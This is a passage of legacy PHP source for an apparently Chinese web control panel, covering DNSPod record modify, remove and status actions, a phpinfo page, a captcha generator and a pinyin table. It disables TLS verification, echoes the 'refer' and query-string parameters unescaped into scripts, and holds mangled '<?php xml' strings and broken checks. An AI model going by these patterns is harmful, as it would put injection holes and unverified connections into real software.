                                AlertBack ("记录或记录值格式错误！" , 2);
                        }       
                }
                if (trim(request("edit")) == "0"){
                        if (trim(request("record_type")) != "A" && trim(request("record_type")) != "URL")
                                if (strripos(trim(request("value")),".") == (strlen(trim(request("value")))-1))
                                        $rvalue = trim(request("value"));
                                else
                                        $rvalue = trim(request("value")).".";
                        else
                                $rvalue = trim(request("value"));
                        if (trim(request("mx")) == "" && trim(request("record_type")) == "MX")  
                                $rmx = "10";
                        elseif (floor(trim(request("mx"))) > "20" && trim(request("record_type")) == "MX")
                                $rmx = "20";
                        elseif (floor(trim(request("mx"))) < "0" && trim(request("record_type")) == "MX")
                                $rmx = "0";
                        elseif (trim(request("record_type")) == "MX")
                                $rmx = trim(request("mx"));
                                
                        if (trim(request("ttl")) == "")
                                $rttl = "10";
                        elseif (trim(request("ttl")) > "604800")
                                $rttl = "604800";
                        elseif (trim(request("ttl")) < "0")
                                $rttl = "1";
                        else
                                $rttl = trim(request("ttl"));
                        if (trim(request("record_type")) != "" && trim(request("record_line")) != "" && trim(request("value")) != ""){
                                if (0){
                                        $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                        '<dnspod>'.
                                                        '<status>'.
                                                        '<code>1</code>'.
                                                        '<message>Record created success</message>'.
                                                        '<created_at>2010-10-08 09:23:30</created_at>'.
                                                        '</status>'.
                                                        '<record>'.
                                                        '<id>5246140</id>'.
                                                        '<name>1286501010</name>'.
                                                        '</record>'.
                                                        '</dnspod>';
                                }       
                                else{   
                                        $ch = curl_init();
                                        $url = "https://dnsapi.cn/Record.Modify";
                                        $data = array(
                                                'login_email' => $dnspoduname,
                                                'login_password' => $dnspodpwd,
                                                'domain_id' => trim(request("domain_id")),
                                                'record_id' => trim(request("record_id")),
                                                'sub_domain' => trim(request("sub_domain")),
                                                'record_type' => trim(request("record_type")),
                                                'record_line' => iconv('gb2312','UTF-8',trim(request("record_line"))),
                                                'value' => $rvalue,
                                                'mx' => $rmx,
                                                'ttl' => $rttl,
                                                'format' => 'xml'
                                        );
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_URL, $url);
                                        curl_setopt($ch, CURLOPT_HEADER, 0);
                                        curl_setopt($ch, CURLOPT_POST, 1);
                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");                                
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                        $xmlstr = curl_exec($ch);
                                        curl_close($ch);
                                }
                        }       
                        
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        $objXml->loadXML($xmlstr);                              

                        if ($objXml->getElementsByTagName("code")->item(0)->nodeValue !== true){
                        }
                        elseif ($objXml->getElementsByTagName("code")->item(0)->nodeValue != "1"){
                                //AlertBack ($objXml->getElementsByTagName("message")->item(0)->nodeValue , 1);
                        }        
                        
                }               
                
                if (trim(request("edit")) == "1"){
                }
                else{   
                        if ($objXml->getElementsByTagName("code")->item(0)->nodeValue == "1"){
                                $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                子域名修改成功！子域名ID：<?php echo $objXml->getElementsByTagName("id")->item(0)->nodeValue?> 实际子域名记录：<?php echo $objXml->getElementsByTagName("name")->item(0)->nodeValue." <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
        <?php 
                echo "<p align=center><script>window.setTimeout(\"location.href=\'".urldecode(trim(request("refer")))."\'\",".$timeout.");</script></p>";
        ?>
</table>                        
        <?php 
                        }
                        else{
                                $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                子域名修改失败！原因：<?php echo $objXml->getElementsByTagName("message")->item(0)->nodeValue." <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
        <?php 
                echo "<p align=center><script>window.setTimeout(\"location.href=\'".urldecode(trim(request("refer")))."\'\",".$timeout.");</script></p>";
        ?>
</table>                        
        <?php 
                        }
                }
        
                break;   // action - Record.Modify end  
        case "Record.Remove": // action - Record.Remove start
                if (trim(request("delok")) == "1"){
                }
                else{
                	if(is_wap()){
                ?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result">
											<a hreF='#' onclick='window.location.href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>&delok=1";'>确认</a>
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>取消</a>
                </td>
        </tr>  
</table> 
				<?php 
                        break;
									}
									else{
				?>

        <script language="vbscript">
        <!--
                Dim delok
                delok = MsgBox("是否删除该相册！", vbOKCancel, "X3193")
                If delok = vbOK Or delok = vbYes Then
                        window.location.href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>&delok=1"
                else    
                        MsgBox("该相册删除取消！")
                        window.location.href="<?php echo trim(request("refer"))?>"
                End If
        //-->
        </script>
                <?php 
                        break;
                     }
                }
                if (trim(request("domain_id")) != "" && trim(request("record_id")) != ""){
                        if (0){
                                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                '<dnspod>'.
                                                '<status>'.
                                                '<code>1</code>'.
                                                '<message>Record deleted.</message>'.
                                                '<created_at>2008-11-26 16:16:09</created_at>'.
                                                '</status>'.
                                                '</dnspod>';
                        }       
                        else{   
                                $ch = curl_init();
                                $url = "https://dnsapi.cn/Record.Remove";
                                $data = array(
                                        'login_email' => $dnspoduname,
                                        'login_password' => $dnspodpwd,
                                        'domain_id' => trim(request("domain_id")),
                                        'record_id' => trim(request("record_id")),
                                        'format' => 'xml'
                                );
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                $xmlstr = curl_exec($ch);
                                curl_close($ch);
                        }
                }
                elseif (trim(request("domain_id")) != "" && trim(request("record_id")) == "" && count($_POST) > 0){
                        if (0){
                                $totalrecord = '220';                   
                                $xmlstr = '<?php xml version="1.0" encoding="utf-8"?>'.
                                                '<dnspod>'.
                                                '<status>'.
                                                '<code>1</code>'.
                                                '<message>Get record list success</message>'.
                                                '<created_at>2008-11-26 16:12:00</created_at>'.
                                                '</status>'.
                                                '<info>'.
                                                '<record_total>'.$totalrecord.'</record_total>'.
                                                '</info>'.
                                                '<records>';
                                if (ceil($totalrecord/$pagesize) > $page){
                                        $strpagesize = $pagesize;
                                }       
                                elseif (ceil($totalrecord/$pagesize) == $page){
                                        $strpagesize = fmod($totalrecord,$pagesize);
                                }                       
                                for($i=1;$i<=$strpagesize;$i++){
                                        $xmlstr = $xmlstr.
                                                '<item>'.
                                                '<id>5246120</id>'.
                                                '<name>@</name>'.
                                                '<line><![CDATA[默认]]></line>'.
                                                '<type>A</type>'.
                                                '<ttl>600</ttl>'.
                                                '<value>1.1.1.1</value>'.
                                                '<mx>0</mx>'.
                                                '<enabled>1</enabled>'.
                                                '<updated_on>2010-10-07 14:14:20</updated_on>'.
                                                '</item>';
                                }               
                                $xmlstr = $xmlstr.
                                                '</records>'.
                                                '</dnspod>';
                        }       
                        else{   
                                $ch = curl_init();
                                $url = "https://dnsapi.cn/Record.List";
                                $data = array(
                                        'login_email' => $dnspoduname,
                                        'login_password' => $dnspodpwd,
                                        'domain_id' => trim(request("domain_id")),
                                        'offset' => $pagesize*($page-1),
                                        'length' => $pagesize,
                                        'format' => 'xml'
                                );
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                $xmlstr = curl_exec($ch);
                                curl_close($ch);
                        }       
                        while(strpos($xmlstr, '<![CDATA[')){
                                $xmlstr = preg_replace("/(.*)(\<\!\[CDATA\[)(.*)(\]\]\>)(.*)/", "\$1\$3\$5", $xmlstr);
                        }
                        if (strpos($xmlstr, '<?php xml version="1.0" encoding="utf-8"')==0){
                                $xmlstr = preg_replace("/(.*)(\<\?xml version=\"1.0\" encoding=\"utf-8\"\?\>)(.*)/", "\$1"."<?php xml version=\"1.0\" encoding=\"gb2312\"?>"."\$3", $xmlstr);
                        }                       
                        
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        // 加Xml 文件    
                        $objXml->loadXML($xmlstr);
                        
                        $objList = $objXml->getElementsByTagName("item");                       
                        if ($objList->length == $pagesize) $strpagesize = $pagesize; else $strpagesize = $objList->length;

                        $totalitem = $objXml->getElementsByTagName("record_total")->item(0)->nodeValue;
                        if (fmod($totalitem, $pagesize) == 0){
                                $totalpage=$totalitem/$pagesize;
                        }       
                        else{
                                $totalpage=ceil($totalitem/$pagesize);
                        }       

                        for($i = 0;$i <= $strpagesize-1;$i++){
                                $objHdd = $objList->item($i);
                                if ($_POST["chidd".$i] != ""){
                                        if (0){
                                                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                                '<dnspod>'.
                                                                '<status>'.
                                                                '<code>1</code>'.
                                                                '<message>Record deleted.</message>'.
                                                                '<created_at>2008-11-26 16:16:09</created_at>'.
                                                                '</status>'.
                                                                '</dnspod>';
                                        }       
                                        else{   
                                                $ch = curl_init();
                                                $url = "https://dnsapi.cn/Record.Remove";
                                                $data = array(
                                                        'login_email' => $dnspoduname,
                                                        'login_password' => $dnspodpwd,
                                                        'domain_id' => trim(request("domain_id")),
                                                        'record_id' => $objHdd->getElementsByTagName("id")->item(0)->nodeValue,
                                                        'format' => 'xml'
                                                );
                                                $ch = curl_init();
                                                curl_setopt($ch, CURLOPT_URL, $url);
                                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                                curl_setopt($ch, CURLOPT_POST, 1);
                                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                                $xmlstr = curl_exec($ch);
                                                curl_close($ch);
                                        }
                                }       
                                if ($xmlstr == ""){
                                }
                                else{
                                        $objXml = new DOMDocument();  
                                        $objXml->preserveWhiteSpace = true;
                                        $objXml->async = false; 
                                        $objXml->loadXML($xmlstr);                              
                                        if ($objXml->getElementsByTagName("code")->item(0)->nodeValue == false || $objXml->getElementsByTagName("code")->item(0)->nodeValue != "1")
                                                break;
                                }       
                        }                               
                }
                elseif (trim(request("domain_id")) != "" && trim(request("record_id")) == "" && count($_POST) == 0){
                        AlertBack ("未选择任何子域名记录！" , 1);
                        break;
                }       

                $objXml = new DOMDocument();  
                $objXml->preserveWhiteSpace = true;
                $objXml->async = false; 
                $objXml->loadXML($xmlstr);                              
        
                if ($objXml->getElementsByTagName("code")->item(0)->nodeValue == "1"){
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                子域名删除成功！<?php  echo $timeout/1000?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        if (count($_POST)==0)
                                echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";
                        else                            
                                echo "<p align=center><script>window.setTimeout(\"history.go(-1)\",".$timeout.");</script></p>";                ?>
</table>                        
                <?php 
                }
                else{
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                子域名删除失败！原因： <?php echo $objXml->getElementsByTagName("message")->item(0)->nodeValue;?><?php  echo " <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        if (count($_POST)==0)
                                echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";
                        else                            
                                echo "<p align=center><script>window.setTimeout(\"history.go(-1)\",".$timeout.");</script></p>";                ?>
</table>                        
                <?php       
                }

                break;   // action - Record.Remove end  
        case "Record.Status": // action - Record.Status start
                if (trim(request("domain_id")) != "" && trim(request("record_id")) != ""){
                        if (0){
                                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                '<dnspod>'.
                                                '<status>'.
                                                '<code>1</code>'.
                                                '<message>Record status changed.</message>'.
                                                '<created_at>2008-11-26 16:16:09</created_at>'.
                                                '</status>'.
                                                '</dnspod>';
                        }       
                        else{   
                                $ch = curl_init();
                                $url = "https://dnsapi.cn/Record.Status";
                                $data = array(
                                        'login_email' => $dnspoduname,
                                        'login_password' => $dnspodpwd,
                                        'domain_id' => trim(request("domain_id")),
                                        'record_id' => trim(request("record_id")),
                                        'status' => trim(request("status")),
                                        'format' => 'xml'
                                );
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                $xmlstr = curl_exec($ch);
                                curl_close($ch);
                        }
                }
                elseif (trim(request("domain_id")) != "" && trim(request("record_id")) == "" && count($_POST) > 0){
                        if (0){
                                $totalrecord = '220';
                                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                '<dnspod>'.
                                                '<status>'.
                                                '<code>1</code>'.
                                                '<message>Get domain list success</message>'.
                                                '<created_at>2008-11-26 16:12:00</created_at>'.
                                                '</status>'.
                                                '<info>'.
                                                '<domain_total>'.$totalrecord.'</domain_total>'.
                                                '</info>'.
                                                '<domains>';
                                if (ceil($totalrecord/$pagesize) > $page){
                                        $strpagesize = $pagesize;
                                }       
                                elseif (ceil($totalrecord/$pagesize) == $page){
                                        $strpagesize = fmod($totalrecord,$pagesize);
                                }                               
                                for($i=1;$i<=$strpagesize;$i++){
                                        $xmlstr = $xmlstr.
                                                        '<item>'.
                                                        '<id>141842</id>'.
                                                        '<name>dnspoo.com</name>'.
                                                        '<grade>D_Free</grade>'.
                                                        '<status>enable</status>'.
                                                        '<records>0</records>'.
                                                        '<shared_from>dnspod@dnspod.com</shared_from>'.
                                                        '</item>';              
                                }
                                $xmlstr = $xmlstr.
                                                '</domains>'.
                                                '</dnspod>';
                        }       
                        else{   
                                $ch = curl_init();
                                $url = "https://dnsapi.cn/Record.List";
                                $data = array(
                                        'login_email' => $dnspoduname,
                                        'login_password' => $dnspodpwd,
                                        'format' => 'xml',
                                        'domain_id' => trim(request("domain_id")),
                                        'offset' => $pagesize*($page-1),
                                        'length' => $pagesize
                                );
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                $xmlstr = curl_exec($ch);
                                curl_close($ch);
                        }
                        $type = trim(request('type'))==''?'mine':trim(request('type'));
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        // 加Xml 文件    
                        $objXml->loadXML($xmlstr);      
                
                        $objList = $objXml->getElementsByTagName("item");                       
                        if ($objList->length == $pagesize) $strpagesize = $pagesize; else $strpagesize = $objList->length;

                        $totalitem = $objXml->getElementsByTagName("domain_total")->item(0)->nodeValue;
                        if (fmod($totalitem, $pagesize) == 0){
                                $totalpage=$totalitem/$pagesize;
                        }       
                        else{
                                $totalpage=ceil($totalitem/$pagesize);
                        }

                        $xmlstr = "";
                        for($i = 0;$i <= $strpagesize-1;$i++){
                                $objHdd = $objList->item($i);
                                if ($_POST["chidd".$i] != ""){
                                        if (0){
                                                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                                '<dnspod>'.
                                                                '<status>'.
                                                                '<code>1</code>'.
                                                                '<message>Record status changed.</message>'.
                                                                '<created_at>2008-11-26 16:16:09</created_at>'.
                                                                '</status>'.
                                                                '</dnspod>';                                    
                                        }       
                                        else{   
                                                $ch = curl_init();
                                                $url = "https://dnsapi.cn/Record.Status";
                                                $data = array(
                                                        'login_email' => $dnspoduname,
                                                        'login_password' => $dnspodpwd,
                                                        'domain_id' => trim(request("domain_id")),
                                                        'record_id' => $objHdd->getElementsByTagName("id")->item(0)->nodeValue,
                                                        'status' => trim(request("status")),
                                                        'format' => 'xml'
                                                );
                                                $ch = curl_init();
                                                curl_setopt($ch, CURLOPT_URL, $url);
                                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                                curl_setopt($ch, CURLOPT_POST, 1);
                                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                                $xmlstr = curl_exec($ch);
                                                curl_close($ch);
                                        }
                                }       
                                if ($xmlstr == ""){
                                }
                                else{
                                        $objXml = new DOMDocument();  
                                        $objXml->preserveWhiteSpace = true;
                                        $objXml->async = false; 
                                        $objXml->loadXML($xmlstr);                              
                                        if ($objXml->getElementsByTagName("code")->item(0)->nodeValue == false || $objXml->getElementsByTagName("code")->item(0)->nodeValue != "1")
                                                break;
                                }       
                        }                               
                }
                elseif (trim(request("domain_id")) != "" && trim(request("record_id")) == "" && count($_POST) == 0){
                        AlertBack ("未选择任何子域名记录！" , 1);
                        break;
                }
                
                $objXml = new DOMDocument();  
                $objXml->preserveWhiteSpace = true;
                $objXml->async = false; 
                $objXml->loadXML($xmlstr);                              
        
                if ($objXml->getElementsByTagName("code")->item(0)->nodeValue == "1"){
                $timeout = "5000"
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                子域名记录<?php  if (trim(request("status")) == "enable"){ ?>启动<?php  }else{ ?>停止<?php }?>成功！<?php echo ($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        echo "<p align=center><script>window.setTimeout(\"location.href=\'".urldecode(trim(request("refer")))."\'\",".$timeout.");</script></p>"
                ?>
</table>                        
                <?php 
                }
                else{
                $timeout = "5000"
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                子域名记录<?php  if (trim(request("status")) == "enable"){ ?>启动<?php  }else{ ?>停止<?php }?>失败！, 原因: <?php echo $objXml->getElementsByTagName("message")->item(0)->nodeValue?><?php echo " <br>".$timeout/1000?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        echo "<p align=center><script>window.setTimeout(\"location.href=\'".urldecode(trim(request("refer")))."\'\",".$timeout.");</script></p>"
                ?>
</table>                        
                <?php       
                }
                break;   // action - Record.Status end
        }       
                        
$style->footer();
//exit;
} // dnspod function end
?>


<?php 
function phpsysinfo(){

syssetini();    
phpinfo();
exit;

}
?>

<?php 
function randcode($count,$type){
$authnum_session = ''; 
if ($type == ''){
	$str = 'abcdefghijkmnpqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'; 
}
elseif ($type == 'number'){
	$str = '1234567890'; 
}
elseif ($type == 'char'){
	$str = 'abcdefghijkmnpqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; 
}

//定义用来显示在图片上的数字和字母; 
$l = strlen($str); //得到字串的长度; 
//循环随机抽取四位前面定义的字母和数字; 
$numcount = $count;
for($i=1;$i<=$numcount;$i++) 
{ 
$num=rand(0,$l-1); 
//每次随机抽取一位数字;从第一个字到该字串最大长度, 
//减1是因为截取字符是从0开始起算;这样34字符任意都有可能排在其中; 
$authnum_session.= $str[$num]; 
//将通过数字得来的字符连起来一共是四位; 
} 
return $authnum_session;
}
?>

<?php 
function checkcode(){ // checkcode function start
        Com_CreatValidCode('ValidCode');
        exit;   
}

function Com_CreatValidCode($pSN){ 
Header("Content-type:image/png",false);
//定义header，声明图片文件，最好是png，无版权之扰; 
//生成新的四位整数验证码 
session_start();//开启session; 
$authnum_session = ''; 
$str = 'abcdefghijkmnpqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'; 
//定义用来显示在图片上的数字和字母; 
$l = strlen($str); //得到字串的长度; 
//循环随机抽取四位前面定义的字母和数字; 
$numcount = trim(request("count"))==""?"4":trim(request("count"));
for($i=1;$i<=4;$i++) 
{ 
$num=rand(0,$l-1); 
//每次随机抽取一位数字;从第一个字到该字串最大长度, 
//减1是因为截取字符是从0开始起算;这样34字符任意都有可能排在其中; 
$authnum_session.= $str[$num]; 
//将通过数字得来的字符连起来一共是四位; 
} 
//$pSN = $authnum_session;
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
		session_register($pSN);
}
 
$_SESSION[$pSN] = $authnum_session; 
//用session来做验证也不错;注册session,名称为authnum_session, 
//其它页面只要包含了该图片 
//即可以通过$_SESSION["authnum_session"]来调用 

//生成验证码图片， 
srand((double)microtime()*1000000); 
$im = imagecreate(52,14);//图片宽与高; 
//主要用到黑白灰三种色; 
$bgcolor = ImageColorAllocate($im, 255,255,255); 
$fontcolor = ImageColorAllocate($im, 0,0,0); 
$gray = ImageColorAllocate($im, 0,0,0); 
//将四位整数验证码绘入图片 
imagefill($im,68,30,$gray); 
//如不用干扰线，注释就行了; 
$li = ImageColorAllocate($im, 0,0,0); 
for($i=0;$i<3;$i++) 
{//加入3条干扰线;也可以不要;视情况而定，因为可能影响用户输入; 
        imageline($im,rand(0,30),rand(0,21),rand(20,40),rand(0,21),$li); 
} 
//字符在图片的位置; 
imagestring($im, 6, 8, -2.5, $authnum_session, $fontcolor); 
for($i=0;$i<90;$i++) 
{//加入干扰象素 
        imagesetpixel($im, rand()%70 , rand()%30 , $gray); 
} 
ImagePNG($im); 
ImageDestroy($im); 

} // checkcode function end
?>

<?php 

/***************************************************************************  
*                        Pinyin.php(做为现在的主流开发语言)  
*                ------------------------------  
*        Date             : Nov 7, 2006  
*        Copyright        : 修改自网络代码,版权归原作者所有  
*        Mail             :   
*        Desc.            : 拼音转换  
*        History          :  
*        Date    :  
*        Author  :   
*        Modif.  :  
*        Usage Example   :  
***************************************************************************/  

function Pinyin($_String, $_Code='gb2312',$_symbol=false,$_lang='cn')  
{  
        if ($_lang == "cn"){
                $_DataKey = "a|ai|an|ang|ao|ba|bai|ban|bang|bao|bei|ben|beng|bi|bian|biao|bie|bin|bing|bo|bu|ca|cai|can|cang|cao|ce|ceng|cha".  
                        "|chai|chan|chang|chao|che|chen|cheng|chi|chong|chou|chu|chuai|chuan|chuang|chui|chun|chuo|ci|cong|cou|cu|".  
                        "cuan|cui|cun|cuo|da|dai|dan|dang|dao|de|deng|di|dian|diao|die|ding|diu|dong|dou|du|duan|dui|dun|duo|e|en|er".  
                        "|fa|fan|fang|fei|fen|feng|fo|fou|fu|ga|gai|gan|gang|gao|ge|gei|gen|geng|gong|gou|gu|gua|guai|guan|guang|gui".  
                        "|gun|guo|ha|hai|han|hang|hao|he|hei|hen|heng|hong|hou|hu|hua|huai|huan|huang|hui|hun|huo|ji|jia|jian|jiang".  
                        "|jiao|jie|jin|jing|jiong|jiu|ju|juan|jue|jun|ka|kai|kan|kang|kao|ke|ken|keng|kong|kou|ku|kua|kuai|kuan|kuang".  
                        "|kui|kun|kuo|la|lai|lan|lang|lao|le|lei|leng|li|lia|lian|liang|liao|lie|lin|ling|liu|long|lou|lu|lv|luan|lue".  
                        "|lun|luo|ma|mai|man|mang|mao|me|mei|men|meng|mi|mian|miao|mie|min|ming|miu|mo|mou|mu|na|nai|nan|nang|nao|ne".  
                        "|nei|nen|neng|ni|nian|niang|niao|nie|nin|ning|niu|nong|nu|nv|nuan|nue|nuo|o|ou|pa|pai|pan|pang|pao|pei|pen".  
                        "|peng|pi|pian|piao|pie|pin|ping|po|pu|qi|qia|qian|qiang|qiao|qie|qin|qing|qiong|qiu|qu|quan|que|qun|ran|rang".  
                        "|rao|re|ren|reng|ri|rong|rou|ru|ruan|rui|run|ruo|sa|sai|san|sang|sao|se|sen|seng|sha|shai|shan|shang|shao|".  
                        "she|shen|sheng|shi|shou|shu|shua|shuai|shuan|shuang|shui|shun|shuo|si|song|sou|su|suan|sui|sun|suo|ta|tai|".  
                        "tan|tang|tao|te|teng|ti|tian|tiao|tie|ting|tong|tou|tu|tuan|tui|tun|tuo|wa|wai|wan|wang|wei|wen|weng|wo|wu".  
                        "|xi|xia|xian|xiang|xiao|xie|xin|xing|xiong|xiu|xu|xuan|xue|xun|ya|yan|yang|yao|ye|yi|yin|ying|yo|yong|you".  
                        "|yu|yuan|yue|yun|za|zai|zan|zang|zao|ze|zei|zen|zeng|zha|zhai|zhan|zhang|zhao|zhe|zhen|zheng|zhi|zhong|".  
                        "zhou|zhu|zhua|zhuai|zhuan|zhuang|zhui|zhun|zhuo|zi|zong|zou|zu|zuan|zui|zun|zuo";  
        }
        elseif ($_lang == "en"){
                $_DataKey = "ah|ai|an|ung|ao|bah|bai|bahn|bung|bao|bei|ben|beoung|bie|bieyan|byyao|bieyea|bien|bing|boh|bwu|cah|cai|cahn|cahng|cao|ce|ceng|chah".  
                        "|chai|chahn|chahng|chao|cheh|cheng|chenng|chir|chon|chou|chuu|chuai|chuahn|chuang|chuie|chuun|chuuo|cir|chon|chou|chu|".  
                        "chuahn|cuie|chuun|cuuo|dah|dai|dahn|dung|dao|de|deung|dea|diyan|diyao|diye|diung|diyu|dohng|deyo|du|durun|duiae|duun|duo|eh|ern|eehr".  
                        "|fa|fahn|faun|fei|fen|fueng|fo|fouo|fu|gah|gai|gan|guang|ggaoo|ggaah|gei|gen|geng|gohng|go|guuu|gwah|gwya|gwan|gwang|gwi".  
                        "|guun|gguo|ha|hyai|han|hung|hao|heh|hei|hen|heng|hong|ho|hu|hhwa|huwai|huuan|hwang|huie|huun|huuo|gee|jia|gian|giyang".  
                        "|jiao|jieyea|jin|jing|jiyohng|jiu|jjyuuy|juyahngn|juyeh|jun|kah|kahi|kahn|kahng|kao|ke|ken|keng|cong|ko|koo|kwa|kwia|kwan|kwang".  
                        "|kwuie|kwun|kwuuo|la|laiy|lan|luang|lao|lllae|lei|leng|leee|liya|liiahn|niang|liyao|leeyae|lin|ling|leeyu|lohng|llowu|luuuu|lv|luuwan|yuie".  
                        "|luun|luwo|ma|mai|marn|mung|maho|meh|meiy|men|meng|mie|miyan|miyao|miye|mien|ming|miyiu|morh|myoh|mwu|nah|nahi|nan|naung|naho|nae".  
